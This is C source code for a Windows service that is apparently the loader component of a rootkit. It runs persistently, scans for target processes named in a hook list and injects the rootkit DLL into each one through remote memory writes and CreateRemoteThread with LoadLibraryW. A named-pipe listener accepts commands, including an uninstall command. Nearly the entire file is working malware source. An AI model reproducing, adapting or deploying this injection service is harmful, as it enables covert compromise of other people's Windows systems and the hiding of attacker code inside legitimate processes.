#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include "Service.h"
#include "../../config.h"

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE hStatus;

BlackList* CreateBlackList() {
    BlackList* list = (BlackList*)malloc(sizeof(BlackList));
    list->head = NULL;
    return list;
}

void AddToBlackList(BlackList* list, DWORD pid) {
    BlackListedPID* newBlackListedPID = (BlackListedPID*)malloc(sizeof(BlackListedPID));
    newBlackListedPID->pid = pid;
    newBlackListedPID->next = list->head;
    list->head = newBlackListedPID;
}

int IsBlackListed(BlackList* list, DWORD pid) {
    BlackListedPID* current = list->head;
    while (current != NULL) {
        if (current->pid == pid) {
            return 1;
        }
        current = current->next;
    }
    return 0;
}

DWORD* GetPIDsAndAddToBlacklist(const wchar_t** processNames, int processCount, int* numPIDs, BlackList* blackList) {
    DWORD* pids = NULL;
    *numPIDs = 0;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Error when creating process snapshot: %lu\n", GetLastError());
        return pids;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        printf("[-] Error getting information from first process: %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return pids;
    }

    do {
        int isNameInList = 0;
        for (int i = 0; i < processCount; i++) {
            if (lstrcmpW(pe32.szExeFile, processNames[i]) == 0) {
                isNameInList = 1;
                break;
            }
        }

        if (isNameInList) {
            if (!IsBlackListed(blackList, pe32.th32ProcessID)) {
                (*numPIDs)++;
                pids = (DWORD*)realloc(pids, sizeof(DWORD) * (*numPIDs));
                pids[(*numPIDs) - 1] = pe32.th32ProcessID;
                AddToBlackList(blackList, pe32.th32ProcessID);
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    return pids;
}

void FreeBlackList(BlackList* list) {
    BlackListedPID* current = list->head;
    while (current != NULL) {
        BlackListedPID* next = current->next;
        free(current);
        current = next;
    }
    free(list);
}

int InjectDLL(DWORD pid) {
    LPCWSTR DllPath = RK_DLL_PATH;

    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID pDllPath = VirtualAllocEx(handle, 0, (wcslen(DllPath) + 1) * sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(handle, pDllPath, DllPath, (wcslen(DllPath) + 1) * sizeof(WCHAR), 0);

    HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW"), pDllPath, 0, 0);
    WaitForSingleObject(hLoadThread, INFINITE);
    VirtualFreeEx(handle, pDllPath, (wcslen(DllPath) + 1) * sizeof(WCHAR), MEM_RELEASE);

    return 0;
}

int UnloadDLL(DWORD pid, LPCWSTR dllName) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] Error opening the process: %lu\n", GetLastError());
        return 1;
    }

    HMODULE hModule = GetModuleHandleW(dllName);
    if (hModule == NULL) {
        printf("[-] Error getting DLL identifier: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    FARPROC pFreeLibrary = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "FreeLibrary");
    if (pFreeLibrary == NULL) {
        printf("[-] Error getting address from FreeLibrary function: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFreeLibrary, hModule, 0, NULL);
    if (hThread == NULL) {
        printf("[-] Error creating remote thread: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

void ServiceMain(int argc, char** argv) {
    serviceStatus.dwServiceType = SERVICE_WIN32;
    serviceStatus.dwCurrentState = SERVICE_START;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    serviceStatus.dwWin32ExitCode = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;

    hStatus = RegisterServiceCtrlHandler(RK_SERVICE_NAME, (LPHANDLER_FUNCTION)ControlHandler);
    StartRkService();

    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &serviceStatus);

    while (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
        Sleep(SLEEP_TIME);
    }
    return;
}

void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &serviceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &serviceStatus);
        return;

    default:
        break;
    }
    SetServiceStatus(hStatus, &serviceStatus);
    return;
}

int StartRkService() {
    BlackList* blackList = CreateBlackList();

    while (1) {
        int numPIDs;
        DWORD* pids = GetPIDsAndAddToBlacklist(processToHook, sizeof(processToHook) / sizeof(processToHook[0]), &numPIDs, blackList);

        if (pids != NULL) {
            if (numPIDs > 0) {
                for (int i = 0; i < numPIDs; i++) {
                    //printf("[+] PID: %d\n", pids[i]);
                    InjectDLL(pids[i]);
                }
            }

            free(pids);
        }

        Sleep(SLEEP_DELAY);
    }

    FreeBlackList(blackList);

    return 0;
}

VOID UninstallRK() {
    for (int i = 0; i < sizeof(processToHook) / sizeof(processToHook[0]); i++) {
        DWORD pid = GetPID(processToHook[i]);

        UnloadDLL(pid, RK_DLL_FILENAME);
    }
    ExitProcess(0);
}

DWORD GetPID(LPCWSTR pn)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (!lstrcmpiW((LPCWSTR)pE.szExeFile, pn))
                {
                    procId = pE.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return (procId);
}

DWORD WINAPI StartPipe(LPVOID lpParam) {
    HANDLE hPipe;
    char buffer[1024];
    DWORD dwRead;

    hPipe = CreateNamedPipeW(RK_PIPE,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,
        1024 * 16,
        1024 * 16,
        NMPWAIT_USE_DEFAULT_WAIT,
        NULL);

    while (hPipe != INVALID_HANDLE_VALUE)
    {
        if (ConnectNamedPipe(hPipe, NULL) != FALSE)
        {
            if (ReadFile(hPipe, buffer, sizeof(buffer), &dwRead, NULL)) {
                unsigned long callbackCode = strtoul(buffer, NULL, 16);

                switch (callbackCode) {
                case RK_UNINSTALL:
                    UninstallRK();
                    break;
                default:
                    break;
                }
            }
        }

        DisconnectNamedPipe(hPipe);
    }
    return 0;
}

int main() {
    HANDLE thread = CreateThread(NULL, 0, StartPipe, NULL, 0, NULL);
    if (thread == NULL) {
        printf("[-] Error creating Thread: %lu\n", GetLastError());
        return 1;
    }

    SERVICE_TABLE_ENTRY ServiceTable[] = {
      {(LPWSTR)RK_SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
      {NULL, NULL}
    };

    StartServiceCtrlDispatcher(ServiceTable);

    WaitForMultipleObjects(NULL, &thread, TRUE, INFINITE);
    CloseHandle(thread);

    return 0;
}